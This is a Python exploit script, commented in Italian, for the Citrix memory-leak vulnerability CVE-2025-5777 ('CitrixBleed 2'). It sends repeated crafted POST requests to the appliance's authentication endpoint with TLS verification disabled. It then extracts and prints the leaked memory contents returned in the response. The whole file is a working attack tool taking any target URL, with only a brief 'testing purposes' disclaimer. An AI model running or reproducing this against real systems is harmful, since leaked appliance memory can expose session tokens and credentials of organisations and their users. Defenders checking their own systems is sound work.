# CVE-2025-5777 [CitrixBleed2] Exploit
# This is for testing purposes.
# Author: Emanuele De Lucia.
# The author NOT responsible for any misuse.

import requests
import argparse
import urllib3
import ssl
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class CustomHttpAdapter(requests.adapters.HTTPAdapter):
    def __init__(self, ssl_context=None, **kwargs):
        self.ssl_context = ssl_context
        super().__init__(**kwargs)

    def init_poolmanager(self, connections, maxsize, block=False):
        self.poolmanager = urllib3.poolmanager.PoolManager(
            num_pools=connections,
            maxsize=maxsize,
            block=block,
            ssl_context=self.ssl_context
        )

def get_legacy_session():
    ctx = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
    ctx.options |= 0x4
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    session = requests.session()
    session.mount('https://', CustomHttpAdapter(ctx))
    return session

def check_citrixbleed2(target_url, attempts):
    """
    Funzione principale che esegue il test per la vulnerabilit√† CVE-2025-5777.
    """
    print(f"[*] Inizio test per CVE-2025-5777 (CitrixBleed 2) su: {target_url}")
    
    vuln_endpoint = "/p/u/doAuthentication.do"
    full_url = f"{target_url.rstrip('/')}{vuln_endpoint}"

    headers = {
        "User-Agent": "PoC-Exploit-CVE-2025-5777",
        "Content-Type": "application/x-www-form-urlencoded",
        "Connection": "close"
    }
    payload = "login"
    legacy_session = get_legacy_session()

    for i in range(attempts):
        print(f"\n--- Tentativo {i + 1}/{attempts} ---")
        
        try:
            response = legacy_session.post(
                full_url, 
                headers=headers, 
                data=payload,
                timeout=10,
                verify=False
            )

            if response.status_code == 200:
                print(f"[+] Ricevuta risposta 200 OK. Analizzo il contenuto...")
                match = re.search(r'<InitialValue>(.*?)</InitialValue>', response.text, re.DOTALL)
                
                if match:
                    leaked_data = match.group(1)
                    if leaked_data:
                        print(f"[!!!] VULNERABILE! Leaked data:")
                        print("------------------- LEAKED DATA START -------------------")
                        print(leaked_data)
                        print("-------------------- LEAKED DATA END --------------------")
                    else:
                        print("[-] Sistema probabilmente NON vulnerabile.")
                else:
                    print("[-] TAG non trovato nella risposta.")
            else:
                print(f"[-] Ricevuto codice di stato non atteso: {response.status_code}")

        except requests.exceptions.RequestException as e:
            print(f"[!] Errore di connessione a {full_url}: {e}")
            break

def main():
    """
    Funzione che gestisce gli argomenti passati da riga di comando.
    """
    parser = argparse.ArgumentParser(
        description="Exploit CVE-2025-5777 (CitrixBleed 2)"
    )
    parser.add_argument("target", help="URL base del target Citrix (es. https://citrix.example.com)")
    parser.add_argument(
        "-n", "--attempts", 
        type=int, 
        default=3, 
        help="Numero di richieste da inviare (default: 3)"
    )
    args = parser.parse_args()
    
    check_citrixbleed2(args.target, args.attempts)

if __name__ == "__main__":
    main()
